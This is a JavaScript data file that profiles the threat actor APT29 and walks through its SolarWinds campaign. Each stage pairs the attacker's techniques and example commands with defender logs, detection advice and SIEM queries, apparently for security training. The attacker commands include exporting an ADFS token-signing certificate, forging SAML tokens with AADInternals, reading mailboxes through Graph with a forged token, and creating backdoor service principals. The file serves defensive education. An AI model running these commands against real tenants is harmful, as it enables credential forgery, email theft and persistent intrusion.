const apt29 = {
  id: "apt29",
  name: "APT29",
  aliases: ["Cozy Bear", "Midnight Blizzard", "The Dukes"],
  origin: "Russia",
  motivation: "Espionage",
  description:
    "APT29 is a sophisticated Russian state-sponsored threat actor attributed to the SVR (Foreign Intelligence Service). Known for stealthy, long-term intrusions targeting governments, think tanks, and critical infrastructure.",
  campaigns: [
    {
      id: "solarwinds-2020",
      name: "SolarWinds Supply Chain Attack",
      year: "2020",
      target: "US Government & Fortune 500",
      summary:
        "APT29 compromised SolarWinds' Orion build pipeline to distribute a backdoored update (SUNBURST) to ~18,000 organizations, enabling stealthy long-term espionage.",
      sources: [
        "CISA Alert AA20-352A",
        "Mandiant UNC2452 Report",
        "Microsoft MSTIC Analysis",
      ],
      stages: [
        {
          id: "initial-access",
          name: "Initial Access",
          ttp: "T1195.002",
          ttpName: "Supply Chain Compromise: Software Supply Chain",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT29 injected the SUNBURST backdoor into SolarWinds Orion software updates (versions 2019.4–2020.2.1). The malicious DLL (SolarWinds.Orion.Core.BusinessLayer.dll) was digitally signed by SolarWinds' legitimate certificate and distributed via official update servers to ~18,000 customers.",
            tools: ["SUNBURST", "Custom DLL injector"],
            commands: [
              "// Malicious code injected into legitimate DLL",
              "// Dormant period: 12-14 days before beaconing",
              "// C2: avsvmcloud[.]com (DGA-based subdomains)",
            ],
          },
          defender: {
            logs: [
              "SolarWinds Orion update installed (Event ID 1033)",
              "New DLL loaded: SolarWinds.Orion.Core.BusinessLayer.dll",
              "Outbound DNS query to avsvmcloud[.]com subdomains",
              "HTTP GET to *.avsvmcloud[.]com over port 443",
            ],
            detection:
              "Extremely difficult at time of attack. Post-compromise: anomalous DNS queries to DGA domains, outbound HTTPS to unknown infrastructure from Orion server.",
            siemQuery:
              'index=* sourcetype=dns query="*.avsvmcloud.com" | stats count by src_ip, query',
            ifMissed:
              "Attacker establishes persistent backdoor across thousands of networks. SUNBURST begins beaconing to C2 infrastructure, enabling hands-on-keyboard access.",
          },
        },
        {
          id: "execution",
          name: "Execution & C2 Establishment",
          ttp: "T1071.001",
          ttpName: "Application Layer Protocol: Web Protocols",
          phase: "Command & Control",
          attacker: {
            summary:
              "SUNBURST used HTTP/HTTPS to blend with legitimate Orion traffic. It performed a 12-14 day dormancy check, verified it wasn't running in a sandbox, then began beaconing to DGA-generated subdomains of avsvmcloud[.]com. Responses directed victims to actor-controlled C2 servers.",
            tools: ["SUNBURST", "TEARDROP", "Cobalt Strike"],
            commands: [
              "GET /swip/upd/SolarWinds.CortexPlugin.Components.dll HTTP/1.1",
              "Host: [dga-subdomain].avsvmcloud[.]com",
              "// Encoded victim hostname + AD domain in URI path",
            ],
          },
          defender: {
            logs: [
              "Repeated HTTPS connections to *.avsvmcloud[.]com",
              "DNS resolution of algorithmically generated subdomains",
              "Unusual User-Agent strings from Orion process",
              "Outbound connections during off-hours from server",
            ],
            detection:
              "Monitor Orion servers for unexpected outbound connections. DGA detection via entropy analysis of DNS queries. Network baseline deviation alerts.",
            siemQuery:
              'index=network src_process="SolarWinds*" dest_port=443 NOT dest IN (known_good_list) | stats count by dest, src_ip',
            ifMissed:
              "Full C2 channel established. Attacker now has interactive access. TEARDROP loader deployed to execute Cobalt Strike Beacon in memory.",
          },
        },
        {
          id: "privilege-escalation",
          name: "Privilege Escalation",
          ttp: "T1078",
          ttpName: "Valid Accounts",
          phase: "Privilege Escalation",
          attacker: {
            summary:
              "APT29 forged SAML tokens using stolen signing certificates (Golden SAML attack) to impersonate any user including global admins in Azure AD / M365. They also leveraged service accounts with excessive privileges that Orion required to function.",
            tools: ["AADInternals", "Custom SAML forger", "Mimikatz"],
            commands: [
              "// Dump ADFS token signing certificate",
              'Export-PfxCertificate -Cert "cert:\\LocalMachine\\My\\<thumbprint>" -FilePath c:\\temp\\adfs.pfx',
              "// Forge SAML assertion for any user",
              "New-AADIntSAMLToken -ImmutableID <id> -Issuer <adfs_url> -PfxFileName adfs.pfx",
            ],
          },
          defender: {
            logs: [
              "ADFS certificate export event (Event ID 70, 1007)",
              "SAML token issued for privileged user outside normal hours",
              "Azure AD sign-in from new IP/location for admin account",
              "Service principal granted new permissions (Unified Audit Log)",
            ],
            detection:
              "Alert on ADFS certificate access. Monitor Azure AD for impossible travel, sign-ins from unexpected IPs. Audit service principal permission changes.",
            siemQuery:
              'index=azure_ad operationName="Add service principal credentials" | stats count by initiatedBy, ipAddress',
            ifMissed:
              "Attacker has persistent, undetectable admin access to cloud environment. Can read all email, access SharePoint, exfiltrate data at will without triggering traditional AV/EDR.",
          },
        },
        {
          id: "lateral-movement",
          name: "Lateral Movement",
          ttp: "T1550.001",
          ttpName: "Use Alternate Authentication Material: Application Access Token",
          phase: "Lateral Movement",
          attacker: {
            summary:
              "Using forged SAML tokens and OAuth access tokens, APT29 moved laterally across cloud services without needing passwords. They added credentials to existing service principals and used Microsoft Graph API to access mailboxes and files.",
            tools: ["AADInternals", "Microsoft Graph API", "Custom tooling"],
            commands: [
              "// Access mailbox using forged token",
              "GET https://graph.microsoft.com/v1.0/users/<target>/messages",
              "Authorization: Bearer <forged_token>",
              "// Add backdoor credentials to service principal",
              "POST https://graph.microsoft.com/v1.0/applications/<id>/addPassword",
            ],
          },
          defender: {
            logs: [
              "OAuth token issued for service principal accessing Graph API",
              "Mass mailbox access via Graph API (Unified Audit Log)",
              "New credential added to service principal",
              "Unusual application accessing sensitive data",
            ],
            detection:
              "Enable Microsoft 365 Unified Audit Logging. Alert on service principals accessing large volumes of mailboxes. Monitor for new credentials added to app registrations.",
            siemQuery:
              'index=o365 Operation="MailItemsAccessed" AppId NOT IN (known_apps) | stats dc(MailboxOwnerUPN) as mailboxes by AppId | where mailboxes > 10',
            ifMissed:
              "Attacker silently reads emails of high-value targets including executives, legal, IT admins. Intelligence collected for months before discovery.",
          },
        },
        {
          id: "persistence",
          name: "Persistence",
          ttp: "T1136.003",
          ttpName: "Create Account: Cloud Account",
          phase: "Persistence",
          attacker: {
            summary:
              "APT29 established multiple persistence mechanisms: added credentials to service principals, created new federated identity providers, and modified existing OAuth applications to maintain access even if SUNBURST was removed.",
            tools: ["AADInternals", "Azure CLI", "Custom backdoors"],
            commands: [
              "// Add new federated domain for persistent access",
              "New-AADIntAccessTokenForAADGraph | Add-AADIntGuestUser",
              "// Create backdoor service principal",
              "az ad sp create-for-rbac --name 'UpdateService' --role Contributor",
              "// Add secret to existing trusted application",
              "az ad app credential reset --id <app_id> --append",
            ],
          },
          defender: {
            logs: [
              "New service principal created (Azure AD Audit Log)",
              "New credential added to existing application",
              "New federated identity provider configured",
              "Role assignment change for service principal",
            ],
            detection:
              "Regularly audit service principals and app registrations. Alert on any new federation configurations. Review OAuth app permissions quarterly.",
            siemQuery:
              'index=azure_ad operationName IN ("Add service principal", "Add application") | stats count by initiatedBy, targetResources',
            ifMissed:
              "Attacker retains access for months/years. Removal of SUNBURST does not evict them. Full re-compromise of Azure AD tenant required.",
          },
        },
      ],
    },
  ],
}

export default apt29